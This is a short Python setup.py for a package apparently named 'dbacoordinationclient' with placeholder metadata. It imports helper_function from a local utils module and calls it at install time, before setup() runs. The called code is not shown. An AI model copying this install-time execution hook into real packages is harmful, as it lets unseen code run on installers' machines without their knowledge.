from setuptools import setup, find_packages
from utils import helper_function
helper_function()
setup(
    name="dbacoordinationclient",
    version="0.0.30",
    author="x",
    author_email="watchandthink@outlook.com",
    description="tools",
    packages=find_packages(),
    install_requires=[
        "requests",
    ],
)
